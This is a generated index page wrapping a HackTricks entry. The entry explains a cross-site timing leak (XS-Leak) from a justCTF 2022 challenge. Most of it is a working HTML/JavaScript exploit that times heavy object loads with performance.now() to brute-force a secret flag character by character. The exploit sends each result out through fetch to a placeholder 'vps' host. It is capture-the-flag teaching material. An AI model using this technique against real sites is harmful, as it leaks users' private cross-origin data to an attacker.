---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# performance.now + Force heavy task

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-pentesting-web-xs-search-performance.now-force-heavy-task` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/xs-search/performance.now-+-force-heavy-task.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [performance.now + Force heavy task](../../topics/pentesting-web/performance.now-force-heavy-task.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-pentesting-web-xs-search-performance.now-force-heavy-task |
| name | performance.now + Force heavy task |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/xs-search/performance.now-+-force-heavy-task.md |

## Preserved Source Material

````yaml
_body: "# performance.now + Force heavy task\n\n{{#include ../../banners/hacktricks-training.md}}\n\n**Exploit taken from\
  \ [https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/](https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/)**\n\
  \nIn this challenge the user could sent thousands of chars and if the flag was contained, the chars would be sent back to\
  \ the bot. So putting a big amount of chars the attacker could measure if the flag was containing in the sent string or\
  \ not.\n\n> [!WARNING]\n> Initially, I didn’t set object width and height, but later on, I found that it’s important because\
  \ the default size is too small to make a difference in the load time.\n\n```html\n<!DOCTYPE html>\n<html>\n  <head> </head>\n\
  \  <body>\n    <img src=\"https://deelay.me/30000/https://example.com\" />\n    <script>\n      fetch(\"https://deelay.me/30000/https://example.com\"\
  )\n\n      function send(data) {\n        fetch(\"http://vps?data=\" + encodeURIComponent(data)).catch((err) => 1)\n   \
  \   }\n\n      function leak(char, callback) {\n        return new Promise((resolve) => {\n          let ss = \"just_random_string\"\
  \n          let url =\n            `http://baby-xsleak-ams3.web.jctf.pro/search/?search=${char}&msg=` +\n            ss[Math.floor(Math.random()\
  \ * ss.length)].repeat(1000000)\n          let start = performance.now()\n          let object = document.createElement(\"\
  object\")\n          object.width = \"2000px\"\n          object.height = \"2000px\"\n          object.data = url\n    \
  \      object.onload = () => {\n            object.remove()\n            let end = performance.now()\n            resolve(end\
  \ - start)\n          }\n          object.onerror = () => console.log(\"Error event triggered\")\n          document.body.appendChild(object)\n\
  \        })\n      }\n\n      send(\"start\")\n\n      let charset = \"abcdefghijklmnopqrstuvwxyz_}\".split(\"\")\n    \
  \  let flag = \"justCTF{\"\n\n      async function main() {\n        let found = 0\n        let notFound = 0\n        for\
  \ (let i = 0; i < 3; i++) {\n          await leak(\"..\")\n        }\n        for (let i = 0; i < 3; i++) {\n          found\
  \ += await leak(\"justCTF\")\n        }\n        for (let i = 0; i < 3; i++) {\n          notFound += await leak(\"NOT_FOUND123\"\
  )\n        }\n\n        found /= 3\n        notFound /= 3\n\n        send(\"found flag:\" + found)\n        send(\"not found\
  \ flag:\" + notFound)\n\n        let threshold = found - (found - notFound) / 2\n        send(\"threshold:\" + threshold)\n\
  \n        if (notFound > found) {\n          return\n        }\n\n        // exploit\n        while (true) {\n         \
  \ if (flag[flag.length - 1] === \"}\") {\n            break\n          }\n          for (let char of charset) {\n      \
  \      let trying = flag + char\n            let time = 0\n            for (let i = 0; i < 3; i++) {\n              time\
  \ += await leak(trying)\n            }\n            time /= 3\n            send(\"char:\" + trying + \",time:\" + time)\n\
  \            if (time >= threshold) {\n              flag += char\n              send(flag)\n              break\n     \
  \       }\n          }\n        }\n      }\n\n      main()\n    </script>\n  </body>\n</html>\n```\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: pentesting-web/xs-search/performance.now-+-force-heavy-task.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/xs-search/performance.now-+-force-heavy-task.md
````
